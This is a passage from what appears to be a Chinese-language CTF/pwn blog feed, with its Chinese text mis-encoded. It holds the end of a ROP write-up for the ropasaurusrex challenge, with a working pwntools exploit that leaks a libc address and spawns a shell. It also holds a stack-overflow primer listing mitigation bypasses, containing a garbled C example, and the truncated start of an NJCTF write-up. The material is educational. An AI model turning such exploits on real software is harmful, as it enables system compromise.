class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_80483F4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ¸…æ™°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¢˜ç›®æµç¨‹éå¸¸ç®€å•ï¼Œå°±è¯»å–ä¸€å®šå­—èŠ‚ï¼Œç„¶åç›´æ¥æ‰“å°<code>WIN\n</code>ã€‚ç´§æ¥ç€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>read</code>å‡½æ•°è¢«é”™è¯¯ä½¿ç”¨ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:080483F2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080483F3                 align 4</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 ; Attributes: bp-based frame</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 sub_80483F4     proc near               ; CODE XREF: main+9p</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 buf             &#x3D; byte ptr -88h</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4                 push    ebp</span><br><span class="line">.text:080483F5                 mov     ebp, esp</span><br><span class="line">.text:080483F7                 sub     esp, 98h</span><br><span class="line">.text:080483FD                 mov     dword ptr [esp+8], 100h ; nbytes</span><br><span class="line">.text:08048405                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804840B                 mov     [esp+4], eax    ; buf</span><br><span class="line">.text:0804840F                 mov     dword ptr [esp], 0 ; fd</span><br><span class="line">.text:08048416                 call    _read</span><br><span class="line">.text:0804841B                 leave</span><br><span class="line">.text:0804841C                 retn</span><br><span class="line">.text:0804841C sub_80483F4     endp</span><br><span class="line">.text:0804841C</span><br><span class="line">.text:0804841</span><br></pre></td></tr></table></figure><p>bufå¤§å°åªæœ‰0x88,ä½†æ˜¯å´å…è®¸è¢«è¯»å…¥0x100çš„å­—èŠ‚å¤§å°ï¼Œè¿™æ˜æ˜¾å¯ä»¥é€ æˆç¼“å†²åŒºæº¢å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/æ¡Œé¢/Rop$ file ./ropasaurusrex</span><br><span class="line">./ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜çŸ¥é“çš„ä¸€ç‚¹æ˜¯ï¼Œç¨‹åºæ˜¯32ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦åƒç¬¬ä¸€ä¸ªé¢˜é‚£æ ·å»æ‰¾å¯„å­˜å™¨ gadgetã€‚<br>åœ¨mainå‡½æ•°ä¸­æœ‰ä¸€ä¸ª<code>write</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ropï¼Œæ¥è¿›è¡Œä¿¡æ¯æ³„æ¼ã€‚æ‰€ä»¥æ”»å‡»æ€å¤§æ¦‚æ˜¯ï¼š</p><ol><li>æ„é€ payload leak å†…å­˜ä¸­çš„ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ¯”å¦‚ read()</li><li>è®¡ç®—libc base</li><li>æ„é€ payload get shell</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bof = <span class="number">0x80483f4</span> <span class="comment"># the vulnerable function</span></span><br><span class="line">buffer_len = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(args.host, args.port)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ropasaurusrex&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * buffer_len</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># saved ebp</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(bof)</span><br><span class="line">payload += p32(<span class="number">1</span>) <span class="comment"># stdout</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>) <span class="comment"># len</span></span><br><span class="line">p.send(payload)</span><br><span class="line">resp = p.recvn(<span class="number">4</span>)</span><br><span class="line">read = u32(resp)</span><br><span class="line">libc_base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * buffer_len</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># saved ebp</span></span><br><span class="line">payload += p32(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># cont</span></span><br><span class="line">payload += p32(libc_base + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>å°ç»“ä¸€ä¸‹ï¼š<br>read@plt()å’Œwrite@plt()å‡½æ•°ã€‚ä½†å› ä¸ºç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰è°ƒç”¨system()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨system()æ¥è·å–shellã€‚ä½†å…¶å®æˆ‘ä»¬æœ‰write@plt()å‡½æ•°å°±å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡write@plt ()å‡½æ•°æŠŠwrite()å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ä¹Ÿå°±æ˜¯write.gotç»™æ‰“å°å‡ºæ¥ã€‚æ—¢ç„¶write()å‡½æ•°å®ç°æ˜¯åœ¨libc.soå½“ä¸­ï¼Œé‚£æˆ‘ä»¬è°ƒç”¨çš„write@plt()å‡½æ•°ä¸ºä»€ä¹ˆä¹Ÿèƒ½å®ç°write()åŠŸèƒ½å‘¢? è¿™æ˜¯å› ä¸ºlinuxé‡‡ç”¨äº†å»¶æ—¶ç»‘å®šæŠ€æœ¯ï¼Œå½“æˆ‘ä»¬è°ƒç”¨write@plit()çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°†çœŸæ­£çš„write()å‡½æ•°åœ°å€linkåˆ°gotè¡¨çš„write.gotä¸­ï¼Œç„¶åwrite@plit()ä¼šæ ¹æ®write.got è·³è½¬åˆ°çœŸæ­£çš„write()å‡½æ•°ä¸Šå»ã€‚ï¼ˆå¦‚æœè¿˜æ˜¯æä¸æ¸…æ¥šçš„è¯ï¼Œæ¨èé˜…è¯»ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…» - é“¾æ¥ã€è£…è½½ä¸åº“ã€‹è¿™æœ¬ä¹¦ï¼‰</p><h2 id="ä¸Šé¢çš„å†…å®¹æ¥è‡ªè’¸ç±³-ä¸€æ­¥ä¸€æ­¥-rop"><a href="#ä¸Šé¢çš„å†…å®¹æ¥è‡ªè’¸ç±³-ä¸€æ­¥ä¸€æ­¥-rop" class="headerlink" title="ä¸Šé¢çš„å†…å®¹æ¥è‡ªè’¸ç±³ -ä¸€æ­¥ä¸€æ­¥ rop"></a>ä¸Šé¢çš„å†…å®¹æ¥è‡ªè’¸ç±³ -ä¸€æ­¥ä¸€æ­¥ rop</h2><p>åšäº†ä¸¤ä¸ªç®€å•çš„rop ç¬¬ä¸€ä¸ªçš„64ä½ï¼Œç¬¬äºŒä¸ªæ˜¯32ä½ï¼ŒåŸºæœ¬ä¸Š ä¹Ÿèƒ½ä½“ä¼šåˆ°ä¸¤è€…çš„åŒºåˆ«äº†ï¼Œä¸€è€…æ˜¯å¯„å­˜å™¨ä¼ å‚ï¼Œä¸€è€…æ˜¯æ ˆä¼ å‚ã€‚è‡³äºAliCTFçš„vsvs ï¼Œæˆ‘æ²¡æ‰¾åˆ°Binç¨‹åºï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸å•ç‹¬åˆ†æäº†ã€‚æˆ‘ä»¬çœ‹çœ‹åˆ«äººçš„wpï¼Œä¾‹å¦‚é“¾æ¥<a href="https://segmentfault.com/a/1190000005718685">https://segmentfault.com/a/1190000005718685</a></p><p>ä¸‹ä¸€ä¸ªå†…å®¹å‡†å¤‡å­¦ä¹  VROPï¼Œä¸€ç§åˆ©ç”¨signalæœºåˆ¶çš„ROPæŠ€æœ¯ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºç¡€æ ˆæº¢å‡ºå¤ä¹  ä¹‹åŸºç¡€</title>
      <link href="stack-overflow-one.html"/>
      <url>stack-overflow-one.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="æ ˆä¸ç³»ç»Ÿæ ˆ"><a href="#æ ˆä¸ç³»ç»Ÿæ ˆ" class="headerlink" title="æ ˆä¸ç³»ç»Ÿæ ˆ"></a>æ ˆä¸ç³»ç»Ÿæ ˆ</h4><p>æ ˆ:ä¸€ç§å…ˆè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ã€‚å¸¸è§æ“ä½œæœ‰ä¸¤ç§ï¼Œè¿›æ ˆ(PUSH) å’Œå¼¹æ ˆ(POP),ç”¨äºæ ‡è¯†æ ˆçš„å±æ€§æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æ ˆé¡¶(TOP)ï¼Œä¸€ä¸ªæ˜¯æ ˆåº•(BASE<br>ç¨‹åºä¸­çš„æ ˆ:</p><ul><li>å†…å­˜ä¸­çš„ä¸€å—åŒºåŸŸï¼Œç”¨æ ˆçš„ç»“æ„æ¥ç®¡ç†ï¼Œä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿</li><li>å¯„å­˜å™¨espä»£è¡¨æ ˆé¡¶ï¼ˆå³æœ€ä½æ ˆåœ°å€ï¼‰</li><li>æ ˆæ“ä½œ<ul><li>å‹æ ˆï¼ˆå…¥æ ˆï¼‰push sth-&gt; [esp]=sth,esp=esp-4</li><li>å¼¹æ ˆï¼ˆå‡ºæ ˆï¼‰pop sth-&gt; sth=[esp],esp=esp+4</li></ul></li><li>æ ˆç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå±€éƒ¨å˜é‡<h5 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h5>å¦‚ä½•é€šè¿‡ç³»ç»Ÿæ ˆè¿›è¡Œå‡½æ•°çš„è°ƒç”¨å’Œé€’å½’<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_b</span><span class="params">(x,y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var_b1,var_b2;</span><br><span class="line"></span><br><span class="line">    rutrun var_b1 * var_b2 ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_a</span><span class="params">(a,b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var_a;</span><br><span class="line">    var_a = fun_b(a*b)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc,chr **argv,chr **envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> var_main;</span><br><span class="line">    var_main = func_a&#123;<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    rutrun var_main;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å‡½æ•°çš„åˆ†å¸ƒåº”å½“æ˜¯:<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-01.png"></a><br>å½“CPUè°ƒç”¨func_Aå‡½æ•°ï¼Œä¼šä»mainå‡½æ•°å¯¹åº”çš„æœºå™¨æŒ‡ä»¤è·³è½¬åˆ°func_Aï¼Œå–å€¼åœ¨æ‰§è¡Œï¼Œæ‰§è¡Œç»“æŸåï¼Œéœ€è¦è¿”å›åˆä¼šè¿›è¡Œè·³è½¬â€¦â€¦.ä»¥æ­¤ç±»ä¼¼çš„è·³è½¬è¿‡ç¨‹ã€‚</li></ul><h5 id="å‡½æ•°è°ƒç”¨æŒ‡ä»¤-call-ret"><a href="#å‡½æ•°è°ƒç”¨æŒ‡ä»¤-call-ret" class="headerlink" title="å‡½æ•°è°ƒç”¨æŒ‡ä»¤: call ret"></a>å‡½æ•°è°ƒç”¨æŒ‡ä»¤: call ret</h5><p>å¤§è‡´è¿‡ç¨‹:</p><ul><li>å‚æ•°å…¥æ ˆ</li><li>è¿”å›åœ°å€å…¥æ ˆ</li><li>ä»£ç åŒºå—è·³è½¬</li><li>æ ˆå¸§è°ƒæ•´:<br>  ä¿å­˜å½“å‰æ ˆå¸§çš„çŠ¶æ€å€¼ï¼Œä¸ºäº†åé¢æ¢å¤æœ¬æ ˆå¸§æ—¶ä½¿ç”¨(EBPå…¥æ ˆ)ï¼›<br>å°†å½“å‰çš„æ ˆå¸§åˆ‡æ¢åˆ°æ–°æ ˆå¸§(ESPå€¼è£…å…¥EBPï¼Œæ›´æ–°æ ˆå¸§åº•éƒ¨)<br>ç»™æ–°æ ˆå¸§åˆ†é…ç©ºé—´(ESPå‡å»æ‰€éœ€è¦ç©ºé—´çš„å¤§å°ï¼ŒæŠ¬é«˜æ ˆé¡¶)<br>ç›¸å…³æŒ‡ä»¤:</li><li>Call func -&gt; push pc, jmp func</li><li>Leave -&gt;mov esp,ebp, pop ebp </li><li>Ret -&gt; pop pc</li></ul><h5 id="å‡½æ•°çº¦å®š"><a href="#å‡½æ•°çº¦å®š" class="headerlink" title="å‡½æ•°çº¦å®š:"></a>å‡½æ•°çº¦å®š:</h5><ul><li>__stdcallï¼Œ__cdeclï¼Œ__fastcallï¼Œ__thiscallï¼Œ__nakedcallï¼Œ__pascal<br>ä»¥ __fastcallä¸ºä¾‹å­:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push  å‚æ•° 3               #å‚æ•°ç”±å³å‘å·¦å…¥æ ˆ</span><br><span class="line">push å‚æ•° 2</span><br><span class="line">push å‚æ•° 1</span><br><span class="line">call å‡½æ•°åœ°å€    #pushå½“å‰æŒ‡ä»¤ä½ç½®ï¼Œè·³è½¬åˆ°æ‰€è°ƒç”¨å‡½æ•°çš„å…¥å£åœ°å€</span><br><span class="line"></span><br><span class="line">push ebp         #ä¿å­˜æ—§æ ˆå¸§çš„åº•éƒ¨</span><br><span class="line">mov ebp,esp    #è®¾ç½®æ–°æ ˆå¸§åº•éƒ¨</span><br><span class="line">sub esp ,xxx      #è®¾ç½®æ–°æ ˆå¸§é¡¶éƒ¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å‚æ•°ä¼ å‚-å–å†³äºè°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹"><a href="#å‚æ•°ä¼ å‚-å–å†³äºè°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹" class="headerlink" title="å‚æ•°ä¼ å‚:å–å†³äºè°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹:"></a>å‚æ•°ä¼ å‚:å–å†³äºè°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹:</h5></li><li>X86 ä»å³å‘å·¦å…¥æ ˆï¼ŒX64 ä¼˜å…ˆå¯„å­˜å™¨ï¼Œå‚æ•°è¿‡å¤šæ—¶æ‰å…¥æ ˆ</li></ul><p>#####ã€€å¯„å­˜å™¨<br>é‡è¦çš„å¯„å­˜å™¨ï¼šrsp/esp, pc, rbp/ebp, rax/eax, rdi, rsi, rdx, rcx<br>ESP: æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå†…å­˜å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨<br>EBP:åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢çš„ä¸€ä¸ªæ ˆå¸§åº•éƒ¨</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-02.png"></a></p><p>####ã€€å †æ ˆæº¢å‡ºåŸç†<br>é€šä¿—çš„è®²ï¼Œæ ˆæº¢å‡ºçš„åŸç†å°±æ˜¯ä¸é¡¾å †æ ˆä¸­åˆ†é…çš„å±€éƒ¨æ•°æ®å—å¤§å°ï¼Œå‘è¯¥æ•°æ®å¿«å†™å…¥äº†è¿‡å¤šçš„æ•°æ®ï¼Œå¯¼è‡´æ•°æ®è¶Šç•Œï¼Œç»“æœè¦†ç›–æ¥çœ‹è€çš„å †æ ˆæ•°æ®ã€‚</p><h4 id="æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶"><a href="#æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶" class="headerlink" title="æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶"></a>æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶</h4><h5 id="æ ˆä¸Šçš„æ•°æ®æ— æ³•è¢«å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œ"><a href="#æ ˆä¸Šçš„æ•°æ®æ— æ³•è¢«å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œ" class="headerlink" title="æ ˆä¸Šçš„æ•°æ®æ— æ³•è¢«å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œ"></a>æ ˆä¸Šçš„æ•°æ®æ— æ³•è¢«å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œ</h5><ul><li>æ•°æ®æ‰§è¡Œä¿æŠ¤(NX/DEP)</li><li>ç»•è¿‡æ–¹æ³•ROP<h5 id="éš¾ä»¥æ‰¾åˆ°æƒ³è¦æ‰¾çš„åœ°å€"><a href="#éš¾ä»¥æ‰¾åˆ°æƒ³è¦æ‰¾çš„åœ°å€" class="headerlink" title="éš¾ä»¥æ‰¾åˆ°æƒ³è¦æ‰¾çš„åœ°å€"></a>éš¾ä»¥æ‰¾åˆ°æƒ³è¦æ‰¾çš„åœ°å€</h5></li><li>åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–(ASLR)</li><li>ç»•è¿‡æ–¹æ³•:infoleak ã€retdlresolve ã€ROP<h5 id="æ£€æµ‹æ ˆæ•°æ®æ˜¯å¦è¢«ä¿®æ”¹"><a href="#æ£€æµ‹æ ˆæ•°æ®æ˜¯å¦è¢«ä¿®æ”¹" class="headerlink" title="æ£€æµ‹æ ˆæ•°æ®æ˜¯å¦è¢«ä¿®æ”¹"></a>æ£€æµ‹æ ˆæ•°æ®æ˜¯å¦è¢«ä¿®æ”¹</h5></li><li>Stack Canary/ Cookie</li><li>ç»•è¿‡æ–¹æ³•: infoleak<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-03.png"></a></li><li><strong>å¦‚ä»Š è®¡ç®—æœºä¿æŠ¤ åŸºæœ¬ä¸Šéƒ½æ˜¯NX+Stack Canary +ASLR</strong><h6 id="CTF-å¸¸ç”¨å¥—è·¯-æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹æ³•"><a href="#CTF-å¸¸ç”¨å¥—è·¯-æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹æ³•" class="headerlink" title="CTF å¸¸ç”¨å¥—è·¯: æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹æ³•"></a>CTF å¸¸ç”¨å¥—è·¯: æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹æ³•</h6></li><li>ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP </li><li>åˆ©ç”¨signalæœºåˆ¶çš„ROPæŠ€æœ¯ï¼šSROP </li><li>æ²¡æœ‰binaryæ€ä¹ˆåŠï¼šBROP ã€dump bin</li><li>åŠ«æŒæ ˆæŒ‡é’ˆï¼šstack pivot </li><li>åˆ©ç”¨åŠ¨æ€é“¾æ¥ç»•è¿‡ASLRï¼šret2dl resolveã€fake linkmap </li><li>åˆ©ç”¨åœ°å€ä½12bitç»•è¿‡ASLRï¼šPartial Overwrite </li><li>ç»•è¿‡stack canaryï¼šæ”¹å†™æŒ‡é’ˆä¸å±€éƒ¨å˜é‡ã€leak canaryã€overwrite canary </li><li>æº¢å‡ºä½æ•°ä¸å¤Ÿæ€ä¹ˆåŠï¼šè¦†ç›–ebpï¼ŒPartial Overwrite <h4 id="ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€-ROP"><a href="#ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€-ROP" class="headerlink" title="ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€:ROP"></a>ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€:ROP</h4>è®²é“ç†å­¦ä¹ ROP ï¼Œçœ‹è’¸ç±³çš„<a href="http://wooyun.bestwing.top:5000/search?keywords=rop&content_search_by=by_drops">æ–‡ç« </a>æ˜¯æœ€å®åœ¨çš„ã€‚è’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ROPç®€ç›´æ˜¯ç»å…¸ç¯‡ç›®ã€‚</li></ul><p>ROPçš„åŸºç¡€å­¦ä¹ å¯ä»¥çœ‹æˆ‘ç¿»è¯‘çš„ä¸€ç¯‡<a href="http://m.bobao.360.cn/learning/appdetail/3569.html">æ–‡ç« </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 XCTF å—äº¬ç«™ã€€çº¿ä¸Šèµ›ã€€NJCTF</title>
      <link href="2017-NJCTF-part-writeup.html"/>
      <url>2017-NJCTF-part-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pingme"><a href="#Pingme" class="headerlink" title="Pingme"></a>Pingme</h1><h2 id="é¢˜ç›®åœ°å€"><a href="#é¢˜ç›®åœ°å€" class="headerlink" title="é¢˜ç›®åœ°å€"></a>é¢˜ç›®åœ°å€</h2><p>nc 218.2.197.235 23745</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¢˜ç›®å¹¶æ²¡æœ‰æä¾›Binæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡leakçš„æ–¹æ³•ï¼ŒæŠŠæ•´ä¸ªBinæ–‡ä»¶dumpä¸‹æ¥ã€‚<br>ä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 